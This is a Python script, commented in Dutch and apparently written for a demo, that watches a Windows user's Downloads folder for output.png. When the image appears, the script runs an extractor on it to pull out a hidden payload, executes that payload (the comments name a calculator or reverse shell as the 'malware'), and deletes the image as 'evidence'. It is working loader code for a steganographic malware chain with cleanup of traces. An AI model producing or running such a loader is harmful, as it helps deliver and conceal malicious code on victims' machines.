import os
import time
import subprocess
from getpass import getuser

def start_watcher():
    # 1. Bepaal het pad naar de Windows Downloads map
    username = getuser()
    download_path = f"C:\\Users\\{username}\\Downloads\\output.png"
    
    print(f"[*] Watcher is gestart. Ik hou {download_path} in de gaten...")

    while True:
        # 2. Check of het bestand bestaat
        if os.path.exists(download_path):
            print("\n[!] Bestand gedetecteerd in Downloads!")
            
            # 3. Voer de extractor uit op het gedownloade bestand
            # We gebruiken 'python' om extractor.py aan te roepen
            print("[*] Bezig met exporteren van payload...")
            subprocess.run(["python", "Scripts/extractor.py", download_path])

            # 4. Voer de extracte payload (het script) uit
            if os.path.exists("extracted_payload.py"):
                print("[!] Payload gevonden! Bezig met uitvoeren...")
                # Hier voeren we de 'malware' (calculator/reverse shell) uit
                subprocess.Popen(["python", "extracted_payload.py"])
                
                # 5. Opruimen (optioneel, voor de demo is het handig om het te verwijderen)
                os.remove(download_path)
                print("[*] Bewijsmateriaal verwijderd. Watcher gaat weer slapen.")
            
        # Wacht 2 seconden voor de volgende check om je CPU te sparen
        time.sleep(2)

if __name__ == "__main__":
    try:
        start_watcher()
    except KeyboardInterrupt:
        print("\nWatcher gestopt.")